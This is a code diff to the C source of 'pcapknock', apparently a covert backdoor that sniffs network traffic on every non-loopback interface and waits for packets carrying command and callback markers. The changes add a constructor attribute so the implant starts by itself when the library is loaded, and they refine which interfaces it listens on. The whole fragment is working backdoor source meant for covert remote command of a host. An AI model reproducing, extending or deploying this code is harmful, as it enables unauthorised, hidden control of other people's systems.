@@ -3,13 +3,14 @@
  * Library/binary which uses pcap to wait for commands
  * By J. Stuart McMurray
  * Created 20190321
- * Last Modified 20190322
+ * Last Modified 20190325
  */
 
 #include <pcap.h>
 #include <pthread.h>
 #include <string.h>
 
+#include "config.h"
 #include "debug.h"
 #include "packet.h"
 
@@ -21,6 +22,9 @@ void do_pcap(void *p);
 
 /* sniff sniffs packets off the wire and responds to commands.  It starts the
  * sniffing in a detached daemon thread. */
+#ifdef CONSTRUCTOR
+__attribute__((constructor))
+#endif /* #ifdef CONSTURUCTOR */
 int
 pcapknock(void)
 {
@@ -32,6 +36,10 @@ pcapknock(void)
 #ifndef CAPTUREDEV
 #define CAPTUREDEV NULL
 #endif /* #ifndef CAPTUREDEV */
+
+        /* Get the lengths of the markers. */
+        cblen = strlen(CBFLAG);
+        cmdlen = strlen(CMDFLAG);
 
         /* If we have a device, use it */
         if (NULL != CAPTUREDEV && 0 != strlen(CAPTUREDEV)) {
@@ -50,6 +58,10 @@ pcapknock(void)
         for (cur = alldevsp; NULL != cur; cur = cur->next) {
                 /* Ignore loopback */
                 if (0 == strncmp(cur->name, "lo", 2))
+                        continue;
+                /* Ignore the any interface, as we do this ourselves */
+                if (3 == strlen(cur->name) &&
+                                0 == strncmp(cur->name, "any",3 ))
                         continue;
                 /* Start capturing on the device */
                 if (0 == sniff_on(cur->name))
